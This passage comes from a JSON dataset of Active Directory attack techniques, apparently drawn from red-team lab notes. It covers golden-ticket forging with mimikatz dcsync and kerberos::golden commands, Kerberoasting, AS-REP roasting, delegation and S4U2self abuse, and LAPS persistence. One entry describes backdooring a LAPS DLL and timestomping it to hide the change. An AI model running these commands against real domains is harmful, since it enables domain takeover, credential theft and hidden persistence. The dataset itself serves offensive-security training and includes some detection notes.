        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\nrevert via:\n>beacon> rev2self\n\n### Create golden ticket ParentChild\n```beacon\npowershell Get-DomainGroup -Identity \"Domain Admins\" -Domain rto.local -Properties ObjectSid\nobjectsid                                    \n---------                                    \nS-1-5-21-2323903455-1895497758-3703895482-512\n\npowershell Get-DomainGroup -Identity \"Domain Admins\" -Domain child.rto.local -Properties ObjectSid\nobjectsid                                   \n---------                                   \nS-1-5-21-1886337448-2504686659-850325809-512\n\nhashdump\nor\nmimikatz lsadump::dcsync /user:CHILD\\krbtgt /domain:child.rto.local\naes256_hmac       (4096) : 0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477\n```\n\n-   `/user` is the username to impersonate.\n-   `/domain` is the current domain.\n-   `/sid` is the current domain SID.\n-   `/sids` is the SID of the target group to add ourselves to.\n-   `/aes256` is the AES256 key of the current domain's krbtgt account.\n-   `/startoffset` sets the start time of the ticket to 10 mins before the current time.\n-   `/endin` sets the expiry date for the ticket to 60 mins.\n-   `/renewmax` sets how long the ticket can be valid for if renewed.\n\n```beacon\nmimikatz kerberos::golden /user:Administrator /domain:child.rto.local /sid:S-1-5-21-1886337448-2504686659-850325809-512 /sids:S-1-5-21-2323903455-1895497758-3703895482-512 /aes256:0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477 /startoffset:-10 /endin:600 /renewmax:10080\n```"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": [
            {
                "id": "b89413d4-b24c-4139-9b49-e42997e29f3c",
                "name": "Retrieve Domain Trusts",
                "description": "Use PowerShell to retrieve the current domain trusts, which will show the relationships between the child and parent domains.",
                "requirements": {},
                "results": [
                    "TRUST:FOUND",
                    "TRUST:TYPE:WINDOWS_ACTIVE_DIRECTORY",
                    "TRUST:DIRECTION:BIDIRECTIONAL"
                ]
            },
            {
                "id": "fb85a3bb-6fc1-4e16-9aad-1f59296d52e5",
                "name": "Get Domain Admins SID",
                "description": "Retrieve the Security Identifier (SID) for the Domain Admins group in the child domain to prepare for Golden Ticket creation.",
                "requirements": {},
                "results": [
                    "CRED:GROUP:DOMAIN_ADMINS",
                    "SID:CHILD_DOMAIN"
                ]
            },
            {
                "id": "ac67e328-25be-4d34-8e59-87d6b16abd82",
                "name": "Generate Golden Ticket",
                "description": "Use Mimikatz to generate a Golden Ticket using the retrieved SIDs and domain information to gain access in the parent domain.",
                "requirements": {
                    "Mimikatz": {}
                },
                "results": [
                    "TICKET:GENERATOR:SUCCESS",
                    "CRED:ACCESS:DOMAIN_ADMINS:parent_domain"
                ]
            },
            {
                "id": "54f95361-2033-49a7-85de-ba28e3caf8f3",
                "name": "Validate Trusts and Privileges",
                "description": "Test the access using the Golden Ticket in the parent domain by accessing resources or executing commands.",
                "requirements": {
                    "Network access to the parent domain": {}
                },
                "results": [
                    "CRED:ACCESS:SUCCESS",
                    "AUTH:VALIDATED:parent_domain_resources"
                ]
            }
        ]
    },
    {
        "id": "181f1d39-4552-41c0-b5d3-ee9f670422ea",
        "name": "AS-REP Roasting",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1558.004",
        "external": false,
        "description": "If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ADSearch",
            "BloodHound",
            "Rubeus"
        ],
        "steps": [
            {
                "id": "e5e794fa-d58e-4a9d-ab77-b28491ec4527",
                "name": "Identify AS-REP Roastable Users",
                "description": "Use ADSearch to find users in the Active Directory that do not require Kerberos pre-authentication by running a LDAP query that filters users based on their attributes.",
                "requirements": {},
                "results": [
                    "USER:ASREP_ROASTABLE"
                ]
            },
            {
                "id": "b075aa0d-de98-4f12-84c7-c038f6248c00",
                "name": "Visualize AS-REP Roastable Users",
                "description": "Utilize BloodHound to visualize and identify users in the Active Directory that are configured to not require Kerberos pre-authentication by executing a specific query in the BloodHound interface.",
                "requirements": {},
                "results": [
                    "USER:VISUALIZED_ASREP_ROASTABLE"
                ]
            },
            {
                "id": "a1306b8e-b6c5-46e6-9bf2-9c29dc983dc6",
                "name": "Perform AS-REP Roasting",
                "description": "Execute Rubeus to request a Kerberos Authentication Service (AS) ticket for the identified AS-REP roastable user without pre-authentication, capturing the resulting hash for offline cracking.",
                "requirements": {},
                "results": [
                    "HASH:KRB5ASREP"
                ]
            },
            {
                "id": "865479a6-5014-43b8-9828-6bfccde33825",
                "name": "Crack AS-REP Hash",
                "description": "Use Hashcat to attempt to crack the obtained AS-REP hash offline, which will help in revealing the plaintext password of the roastable user.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "f9407c6e-dadb-4405-8565-b4111a0f2f34",
        "name": "Constrained Delegation",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Constrained Delegation\nMore secure method of [[Unconstrained Delegation]].\nTGTs of users are no longer cached, but it allows to request a TGS for another user with its own TGT.\n\nIt can only act on behalf of a user to the **cifs** service on **WKSTN2**. With CIFS file shares can be listed, files can be uploaded and downloaded, and the Service Control Manager ([[PsExec]]) can be controlled.\n\nTo perform the delegation, we need TGT of the principal (machine or user) trusted for delegation. We can extract:\n- from a machine (`Rubeus dump`) \n- using the NTLM / AES keys and ask for the TGT ([[eKeys]] + [[Rubeus#Request TGT and inject into sacrificial process]].\n\n\n## Alternate Service Name\nEven if the service for a specific workstation is not useful, it can be changed via `/altservice` in [[Rubeus]] since its not being validated in s4u.\n\n\n## Check stored TGT\nUse `Rubeus describe` to show information about the ticket.",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ADSearch",
            "BloodHound",
            "Powermad",
            "PowerView",
            "Rubeus"
        ],
        "steps": [
            {
                "id": "bd8b1e55-9b74-4d63-a3ea-30bb8ac68c1d",
                "name": "Identify Constrained Delegation Configurations",
                "description": "Query Active Directory for all computer accounts configured for constrained delegation and their allowed delegation targets.",
                "requirements": {},
                "results": [
                    "CRED:DELEGATE"
                ]
            },
            {
                "id": "5e416f30-fc66-4aac-932c-cdffb262012e",
                "name": "Enumerate Constrained Delegation Permissions with BloodHound",
                "description": "Utilize BloodHound to identify user and computer accounts with constrained delegation permissions within the environment.",
                "requirements": {},
                "results": [
                    "CRED:DELEGATE"
                ]
            },
            {
                "id": "bc17f6d2-d036-447b-b752-b4d8e1861f68",
                "name": "Request TGT from Constrained Delegation Principal",
                "description": "Use Rubeus to gather and request a ticket-granting ticket (TGT) for impersonating a user in the environment. Specify the SPN for CIFS service on the designated workstation.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "aef50593-098e-4c24-93d9-718c8a6481a0",
                "name": "Use Alternate Service Name in TGS Request",
                "description": "Request a TGS using Rubeus with an alternative service name if the designated service is not usable. This modifies the service context for impersonation.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "45546ae6-be8a-493b-a888-ca47f7794a43",
                "name": "Check TGT Details",
                "description": "Use Rubeus to examine details of an existing ticket to verify the service principal and user context covered by the TGT.",
                "requirements": {},
                "results": [
                    "TGT:DETAILS",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "a762e69a-6039-4b4c-a9c2-d7f7e9fca287",
        "name": "Kerberoasting",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1558.003",
        "external": false,
        "description": "NoDescription",
        "content": "# Kerberoasting\nServices run on a machine under the context of a user account. These accounts are either local to the machine (LocalSystem, LocalService, NetworkService) or are domain accounts (e.g. `DOMAIN\\mssql`).\n\nA Service Principal Name (SPN) is a unique id of a service instance. SPNs are configured on the User Object and used by [[Kerberos]] to match a service instance to a logon account.\n\nPart of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service. By Kerberoasting a TGS is requested for the user running that service which can be cracked offline to reveal the users plain-text passwords.\n\nProcess:\n1. Identify users with:\n- [[BloodHound#Kerberoasting]]\n- [[ADSearch#Identify kerberoastable users]]\n2. [[Rubeus]] can be used to perform the kerberoasting.\n- [[Rubeus#Kerberoasting]]\n- [[Rubeus#Targeted Kerberoasting]]\n3. Cracking\n- [[Hashcat#Cracking krb5tgs]]\n\n## Detection\nWhen a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.\n\nYou can find them in Kibana with:\n>event.code: 4769\n\n>event.code: 4769 and winlog.event_data.ServiceName : svc_xxx\n\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ADSearch",
            "BloodHound",
            "Rubeus"
        ],
        "steps": [
            {
                "id": "c1396bbf-5257-4743-bc59-3b2c052d64b2",
                "name": "Identify Kerberoastable Users",
                "description": "Use ADSearch to find user accounts with Service Principal Names (SPNs) that are eligible for Kerberoasting. This involves querying Active Directory for accounts with the servicePrincipalName attribute.",
                "requirements": {},
                "results": [
                    "KERB:USER_SPN_FOUND"
                ]
            },
            {
                "id": "e5a75c68-0f4c-4b0c-a841-1e3bed292795",
                "name": "Kerberoast All SPNs",
                "description": "Execute Rubeus to request TGS tickets for all accounts with SPNs. This action will retrieve the TGS tickets that can later be cracked to reveal passwords.",
                "requirements": {
                    "tool": "Rubeus",
                    "access": "Domain access"
                },
                "results": [
                    "KERB:TGS_RETRIEVED",
                    "KERB:HASH"
                ]
            },
            {
                "id": "51a50431-e49a-4ed6-9c4b-6a4e4006d5dd",
                "name": "Targeted Kerberoasting",
                "description": "Use Rubeus to perform targeted Kerberoasting on a specific service account by providing the account name. This retrieves the TGS for that particular user.",
                "requirements": {
                    "tool": "Rubeus",
                    "access": "Domain access"
                },
                "results": [
                    "KERB:TARGETED_TGS_RETRIEVED",
                    "KERB:TARGETED_HASH"
                ]
            },
            {
                "id": "91e68855-5f6f-4c4c-b5b5-e9cb683493d9",
                "name": "Crack Kerberos TGS Tickets",
                "description": "Utilize Hashcat to crack the retrieved Kerberos ticket hashes. This step involves using a robust wordlist to test potential passwords for the hashed TGS tickets.",
                "requirements": {
                    "tool": "Hashcat",
                    "environment": "Cracking environment with GPU support"
                },
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "7efc86a1-05a1-4e91-81e0-f7343823bd39",
                "name": "Monitor for Kerberos Events",
                "description": "Check Windows Event Logs for event 4769, which indicates that a TGS was requested, to detect Kerberoasting activity. This can be performed using Sysmon or directly from the Windows event viewer.",
                "requirements": {},
                "results": [
                    "EVENT:4769_DETECTED"
                ]
            }
        ]
    },
    {
        "id": "2f85eaf6-17a6-4f36-85ab-eb8fd0499fd1",
        "name": "Linux Credential Cache",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "Kerberos Credential Cache (ccache) files store the Kerberos credentials, usually a TGT, of a user authenticated to a domain-joined Linux machine. With it you can request a service ticket (TGS) for any other service in the domain.",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "901ec1a7-aeb1-4f9d-bf54-9815c37bb9fe",
                "name": "List Temporary Directory for Credential Cache Files",
                "description": "Check the /tmp/ directory for any Kerberos Credential Cache files that are likely stored as 'krb5cc_*'. This is where users' cached credentials might reside, allowing for further investigation.",
                "requirements": {},
                "results": [
                    "CRED:KRB5CC_FILES"
                ]
            },
            {
                "id": "b9b979bc-ddee-4f3d-b0ca-0b7e9bd5619c",
                "name": "Check Permissions on Credential Cache Files",
                "description": "Verify the file permissions of any found Credential Cache files. Since these files should be accessible only to the user who owns them, permissions can indicate potential security misconfigurations.",
                "requirements": {},
                "results": [
                    "PERM:VALID",
                    "PERM:INVALID"
                ]
            },
            {
                "id": "6c3a0b89-02a6-4080-ca89-d3bf15fcbc6a",
                "name": "Convert Credential Cache to Kerberos Ticket",
                "description": "Use the Impacket tool to convert the found ccache file into a .kirbi Kerberos ticket file, which is required for further exploitation through tools like Cobalt Strike.",
                "requirements": {
                    "tools": [
                        "Impacket"
                    ]
                },
                "results": [
                    "TICKET:KIRBI"
                ]
            },
            {
                "id": "dbbd1db1-bcfc-4740-913b-5a5a57c6424b",
                "name": "Test Kerberos Ticket for Validity",
                "description": "After conversion, validate the generated .kirbi ticket using Kerberos tools to check if it can be used for service tickets within the domain context.",
                "requirements": {
                    "tools": [
                        "Kerberos",
                        "Impacket"
                    ]
                },
                "results": [
                    "TICKET:VALID",
                    "TICKET:INVALID"
                ]
            }
        ]
    },
    {
        "id": "35bdc37e-81a4-4618-bcbb-ca785e8f91c8",
        "name": "Printer Bug",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "Forcing any machine in a forest to authenticate to another machine via the MS-RPRN Print System Remote Protocol, which is accessible by all domain users and enabled by default.",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [
            "SpoolSample",
            "SweetPotato"
        ],
        "steps": [
            {
                "id": "a1210d48-ef9c-4a88-bd2c-4b50dc0dc6bd",
                "name": "Set up printer change notification",
                "description": "Execute the RpcRemoteFindFirstPrinterChangeNotificationEx() function on wkstn1 to set up change notifications on dc-2, triggering authentication requests from dc-2 to wkstn1.",
                "requirements": {},
                "results": [
                    "AUTH:REQUEST",
                    "DC:2_TGT_INITIATED"
                ]
            },
            {
                "id": "c1c1f98d-762f-4c3a-abb1-ed48e174d8bb",
                "name": "Monitor for TGT capture",
                "description": "Use Rubeus on the server with Unconstrained Delegation to monitor for TGT capture. Set up the monitoring to log captures from dc-2.",
                "requirements": {
                    "tool": "Rubeus"
                },
                "results": [
                    "TGT:CAPTURED",
                    "USER:DC-2$"
                ]
            },
            {
                "id": "5fbcf4e7-3922-4417-84bc-7a4ff3334a69",
                "name": "Capture TGT",
                "description": "Confirm the TGT has been captured successfully, observing details such as the User, StartTime, and EndTime using the logs from the monitoring step.",
                "requirements": {},
                "results": [
                    "TGT:SUCCESS",
                    "USER:DC-2$",
                    "TIME:VALID"
                ]
            },
            {
                "id": "1f2558c0-a6be-4637-aa6d-b65859b4cebf",
                "name": "Create new logon session",
                "description": "Using Overpass-the-Hash, create a new logon session with the captured TGT and use DCSync to retrieve AD data.",
                "requirements": {
                    "tool": "Overpass-the-Hash"
                },
                "results": [
                    "SESSION:CREATED",
                    "DCSYNC:SUCCESS"
                ]
            }
        ]
    },
    {
        "id": "5b0f70c8-a1b6-42db-b7da-6f034b2ba6a7",
        "name": "Resource Based Constrained Delegation (RBCD)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Resource Based Constrained Delegation (RBCD)\n1. Non-privileged account on a Windows 10 machine\n2. Privileges to write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a domain controller\n3. Create a new computer account due to the default MachineAccountQuota = 10\n4. Set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to contain a security descriptor with the computer account from step 3\n5. Leverage Rubeus to abuse resource-based constrained delegation\n\nsources:\n- https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/\n- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution\n\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Powermad"
        ],
        "steps": [
            {
                "id": "45c74de3-ba3b-4ddf-8b48-5e0218d6a965",
                "name": "Verify Non-privileged Account",
                "description": "Confirm that the account being used is non-privileged on a Windows 10 machine. Ensure the account is not a member of any group with elevated privileges.",
                "requirements": {},
                "results": [
                    "ACCOUNT:NON-PRIVILEGED"
                ]
            },
            {
                "id": "574cf1a5-bb1c-4ae7-bbbb-de36d56df678",
                "name": "Check msDS-AllowedToActOnBehalfOfOtherIdentity Privileges",
                "description": "Ensure that the account has permissions to write the 'msDS-AllowedToActOnBehalfOfOtherIdentity' attribute on a domain controller by checking the access control entries in the Active Directory.",
                "requirements": {},
                "results": [
                    "PRIVILEGE:WRITE_MSDS"
                ]
            },
            {
                "id": "c44d60e5-047d-474d-a4a7-2b9059079896",
                "name": "Create New Computer Account",
                "description": "Use the Powermad tool to create a new computer account, utilizing the default MachineAccountQuota which is typically set to 10. The command creates an account for later use.",
                "requirements": {
                    "Powermad": {}
                },
                "results": [
                    "ACCOUNT:NEW-COMPUTER"
                ]
            },
            {
                "id": "cfe6c49f-4ad1-4ac4-bf6c-5793b1705539",
                "name": "Set msDS-AllowedToActOnBehalfOfOtherIdentity Attribute",
                "description": "Configure the 'msDS-AllowedToActOnBehalfOfOtherIdentity' attribute on the newly created computer account to include a security descriptor that allows delegation.",
                "requirements": {
                    "Powermad": {}
                },
                "results": [
                    "ATTRIBUTE:MSDS-SET"
                ]
            },
            {
                "id": "0f7bff59-94d8-43a1-b1f3-ee1d5a6f2f95",
                "name": "Use Rubeus for Delegation Abuse",
                "description": "Leverage Rubeus to perform RBCD exploitation by requesting service tickets on behalf of the compromised account and obtaining elevated privileges to sensitive resources.",
                "requirements": {},
                "results": [
                    "CRED:ACCESS-RESTORED"
                ]
            }
        ]
    },
    {
        "id": "d136c430-5fff-4bc7-805a-9ae66f5a1078",
        "name": "S4U2self Abuse",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# S4U2self Abuse\nGain access to a domain computer if we have its RC4, AES256 or TGT.\n\nS4U = Service for User  \nExtensions:\n* S4U2self = Service for User to Self  \nAllows a service to obtain a TGS to itself on behalf of a user\n* S4U2proxy = Service for User to Proxy\nAllows the service to obtain a TGS on behalf of a user to a second service\n\nGaining TGT for a computer wo local admin:\n* [[Kerberos/Printer Bug]] and a machine with [[unconstrained delegation]]\n* [[NTLM relaying]]\n* [[Misconfigured Certificate Templates]]\n\nProblem:  \nA TGT for WKSTN2 imported into a sacrificial session cannot access C$.\n\nSolution:  \nAbuse S4U2self to obtain a TGS to itself, as a user we know **is** a local admin like a domain admin.\n\n## Steps to exploit S4U2self Abuse\n",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [
            "\n## [[ASN Editor]]\nTo modify a ticket, open it with the ASN Editor.  Find the two instances where the **GENERAL STRING** \"WKSTN2$\" appears. ![](/Images/Pasted%20image%2020220316222605.png)\nDouble-click them to open the **Node Content Editor** and replace these strings with \"cifs\".  We also need to add an additional string node with the FQDN of the machine. Right-click on the parent **SEQUENCE** and select **New**.  Enter **1b** in the **Tag** field and click **OK**.  Double-click on the new node to edit the text.\n ![](/Images/Pasted%20image%2020220316222614.png)"
        ],
        "tools": [
            "ASN Editor"
        ],
        "steps": [
            {
                "id": "1e537709-0434-45f8-9f58-74835521ea23",
                "name": "Execute Rubeus for S4U2self request",
                "description": "Run Rubeus to perform the S4U2self request using appropriate parameters to obtain a TGS for the service account WKSTN2$.",
                "requirements": {},
                "results": [
                    "TGS:WKSTN2$",
                    "TGT:SUCCESS"
                ]
            },
            {
                "id": "109a0c78-5b80-4d97-b3b0-134eab57a577",
                "name": "Write TGS to file",
                "description": "Save the obtained TGS ticket in .kirbi format to a specified location on the filesystem.",
                "requirements": {},
                "results": [
                    "TICKET:SAVED",
                    "FILE_PATH:C:\\Users\\Administrator\\Desktop\\wkstn2-s4u.kirbi"
                ]
            },
            {
                "id": "c3ef219e-c1e1-4c39-a575-62cef38e43f4",
                "name": "Check stored TGT status",
                "description": "Use Rubeus to check the status of the stored TGT to confirm it has been obtained successfully.",
                "requirements": {},
                "results": [
                    "TGT:VALID",
                    "TGT:CONFIRMED"
                ]
            },
            {
                "id": "2df87779-4f02-4ec6-bb93-3775ad901845",
                "name": "Open TGS with ASN Editor",
                "description": "Open the saved TGS file in the ASN Editor to modify the service name from WKSTN2$ to cifs and add the necessary FQDN.",
                "requirements": {},
                "results": [
                    "TICKET:MODIFIED",
                    "SERVICE_NAME:cifs"
                ]
            },
            {
                "id": "9f9f3d6b-b274-4aab-918a-141ee76ad5ce",
                "name": "Impersonate user with modified TGS",
                "description": "Utilize the modified TGS file to impersonate the target user by passing the ticket into the session and using it to access network resources.",
                "requirements": {},
                "results": [
                    "ACCESS:GRANTED",
                    "C$ACCESS:SUCCESS"
                ]
            }
        ]
    },
    {
        "id": "c96fafcf-6b76-462a-829e-87d48ab46611",
        "name": "Unconstrained Delegation",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Unconstrained Delegation\nDelegation: User or a service acting on behalf of another user to another service\nExample: User authenticates to a front-end web application that serves a back-end database. The front-end application needs to authenticate to the back-end database (using Kerberos) as user.\n\nIf unconstrained delegation: KDC includes a copy of the user\u2019s TGT inside the TGS.\n\n## Exploit\n1. [[Rubeus#Unconstrained Delegation]] can be used to monitor for new TGTs cached on the machine.",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ADReaper",
            "ADSearch",
            "BloodHound",
            "Rubeus"
        ],
        "steps": [
            {
                "id": "ebdbadf0-e284-4e4b-8a66-59f3847f231e",
                "name": "List AD objects with Unconstrained Delegation",
                "description": "Use ADReaper to list Active Directory objects that have Unconstrained Delegation enabled. This may help identify potential targets for further exploitation if they misuse delegation.",
                "requirements": {
                    "tool": "ADReaper",
                    "permissions": "Domain user credentials",
                    "environment": "Access to the domain controller"
                },
                "results": [
                    "INFO:UNC_ENABLED",
                    "OBJECT:AD_OBJECTS"
                ]
            },
            {
                "id": "5b2b5967-f32a-4326-8ded-a9d6fc32a30c",
                "name": "Identify unconstrained delegation using ADSearch",
                "description": "This step utilizes ADSearch to specifically search for computer accounts in Active Directory that have unconstrained delegation by querying for userAccountControl flags that indicate this setting.",
                "requirements": {
                    "tool": "ADSearch",
                    "permissions": "Domain user credentials",
                    "environment": "Access to an LDAP server"
                },
                "results": [
                    "INFO:UNC_ENABLED",
                    "OBJECT:COMPUTER_ACCOUNTS"
                ]
            },
            {
                "id": "6aaabbd6-a765-4d91-bc25-82ba717e8338",
                "name": "Query for Computers with Unconstrained Delegation using BloodHound",
                "description": "Run a query in BloodHound to identify computers that have the unconstrained delegation flag set. Such computers may be particularly vulnerable to exploitation.",
                "requirements": {
                    "tool": "BloodHound",
                    "permissions": "Directory access rights",
                    "environment": "BloodHound installed and configured with necessary data"
                },
                "results": [
                    "INFO:UNC_ENABLED",
                    "OBJECT:COMPUTER_NODES"
                ]
            },
            {
                "id": "ed558ecc-bc04-46f0-bca9-8b4e1ed196d1",
                "name": "Monitor cached TGTs with Rubeus",
                "description": "Leverage Rubeus to monitor for newly cached TGTs on a system. This monitoring can initiate when a user authenticates, allowing interception of their TGT for further exploitation.",
                "requirements": {
                    "tool": "Rubeus",
                    "permissions": "Administrator access on the target machine",
                    "environment": "Windows environment with Rubeus executable"
                },
                "results": [
                    "INFO:TGT_MONITORING",
                    "TGT:NEW_TGT_CACHED"
                ]
            }
        ]
    },
    {
        "id": "877abf27-ca85-434c-8e90-739356c8aaff",
        "name": "LAPS Backdoor",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "category": "LAPS",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "94e0a2ae-13ab-41c4-a742-fc8b2c001a92",
                "name": "Locate LAPS Scripts",
                "description": "Identify the location of the Local Administrator Password Solution (LAPS) scripts in the system. Verify the presence of required files including AdmPwd.PS.dll and AdmPwd.PS.psd1.",
                "requirements": {},
                "results": [
                    "FILE:AdmPwd.PS.dll",
                    "FILE:AdmPwd.PS.psd1"
                ]
            },
            {
                "id": "3e9ed5e8-e4c5-4d69-a0b9-baf6ff356e21",
                "name": "Backdoor Get-AdmPwdPassword",
                "description": "Modify the Get-AdmPwdPassword cmdlet to log passwords to a file. Inject the necessary code snippet into the Cmdlet implementation to append the password information to C:\\Temp\\LAPS.txt.",
                "requirements": {},
                "results": [
                    "CODE:Injection_Success"
                ]
            },
            {
                "id": "b32e63f8-9d53-4e89-844e-fd295947d2b2",
                "name": "Upload AdmPwd.PS.dll",
                "description": "Transfer the modified AdmPwd.PS.dll file to the target machine at C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AdmPwd.PS\\ to replace the original version.",
                "requirements": {
                    "access": "Write permissions to the target directory"
                },
                "results": [
                    "FILE:AdmPwd.PS.dll:UPLOAD"
                ]
            },
            {
                "id": "0abc8b6c-5b7f-42d5-b6f2-e72e0de0a6a1",
                "name": "Timestomp AdmPwd.PS.dll",
                "description": "Clone the timestamp from AdmPwd.PS.psd1 and apply it to the uploaded AdmPwd.PS.dll file. This action is intended to conceal file modifications.",
                "requirements": {},
                "results": [
                    "FILE:AdmPwd.PS.dll:Timestomp_Success"
                ]
            }
        ]
    },
    {
        "id": "d57dbcf9-32b8-4a55-910e-20dda01e1616",
        "name": "LAPS Persistence",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Local Administrator Password Solution (LAPS) Persistence\n\n## Increase expiration date (persistence)\n\u26a0\ufe0fThe password will still reset in case of:\n- `Reset-AdmPwdPassword` cmdlet\n- `Do not allow password expiration time longer than required by policy` is enabled in the LAPS GPO.\n\nRequirements:\n* Expiration time = epoch value\n* SYSTEM permission\n\n>powershell Get-DomainObject -Identity wkstn2 -Properties ms-mcs-admpwdexpirationtime\n\n>powershell Set-DomainObject -Identity wkstn2 -Set @{\"ms-mcs-admpwdexpirationtime\"=\"1913564304000\"}\n```\n\n```beacon\nbeacon> powershell Get-AdmPwdPassword -ComputerName wkstn2 | fl\n\nComputerName        : WKSTN2\nDistinguishedName   : CN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp\nPassword            : awdc1948wa4dc1\nExpirationTimestamp : 8/21/2030 5:38:24 PM\n```\n\n\n## Tools\n########\n########",
        "category": "LAPS",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "b6c399bc-e3b6-4b3b-aed2-79178c9755a5",
                "name": "Check Current LAPS Password Expiration",
                "description": "Retrieve the current expiration time of the LAPS password for a specific computer object in Active Directory.",
                "requirements": {
                    "SYSTEM permission": {}
                },
                "results": [
                    "LAPS:EXPIRATION_TIME"
                ]
            },
            {
                "id": "1c0e927f-76eb-458a-a62f-23b91c3ebcb8",
                "name": "Set New LAPS Password Expiration",
                "description": "Update the expiration time of the LAPS password for a specific computer object to a future epoch value to maintain persistence.",
                "requirements": {
                    "SYSTEM permission": {}
                },
                "results": [
                    "LAPS:SET_EXPIRATION"
                ]
            },
            {
                "id": "8078e240-f905-4f47-8514-9a5374cdbc79",
                "name": "Retrieve LAPS Password",
                "description": "Access and display the current LAPS password and its expiration time for a specific computer object in Active Directory.",
                "requirements": {
                    "SYSTEM permission": {}
                },
                "results": [
                    "CRED:PASS",
                    "LAPS:COMPUTER_NAME",
                    "LAPS:EXPIRATION_TIMESTAMP"
                ]
            }
        ]
    },
    {
        "id": "2a551522-a596-4694-acc4-4eef07127e67",
        "name": "Local Administrator Password Solution (LAPS)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Local Administrator Password Solution (LAPS)\nWhen machines are build with a golden image to ensure consistency and compliance every machine receives the same password for each user.\n\nLAPS by Microsoft is a solution to manage credentials of the local administrator (RID 500 or custom) account on every machine. It ensures that the password for each account is different, random, and automatically changed on a defined schedule. \n\nThe process:\n1.  The Active Directory schema has two new attributes to computer objects, called `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime`.\n2.  By default, only a Domain Admin can read the `AdmPwd` attribute. Each computer can update these attributes on its own object.\n3.  Rights to read `AdmPwd` can be delegated (users, groups etc).\n4.  GPOs are ususally used to deploy LAPS (or SCCM) and its configuration.\n6.  On `gpupdate`, the LAPS will check the machines `AdmPwdExpirationTime` attribute. If the received time is passed, it will generate a new password \nand updates the `AdmPwd` attribute.\n\n## Identify\n* Via files\n  > ls C:\\Program Files\\LAPS\\CSE\n* Via GPO guessing [[PowerView#Get GPOs filter with name]]\n  The config can be dumped like this [[Dump GPOs]]\n* Via searching for computers with ``ms-Mcs-AdmPwdExpirationTime`` [[PowerView#Search computers with property]]\n* [[BloodHound#Local Administrator Password Solution (LAPS)]]\n\n\n## Modify\nIf LAPS PowerShell cmdlets are installed\n```beacon\nbeacon> powershell Get-Command *AdmPwd*\n\nCommandType     Name                                               Version    Source\n-----------     ----                                               -------    ------\nCmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS\nCmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS\nCmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS\nCmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS\n```",
        "category": "LAPS",
        "stealthy": false,
        "changes": [
            "\n## [[BloodHound]]\nFind computers that have LAPS applied to them:\n>MATCH (c:Computer {haslaps: true}) RETURN c\n\nAny groups that have an edge to machines via LAPS:\n>MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p",
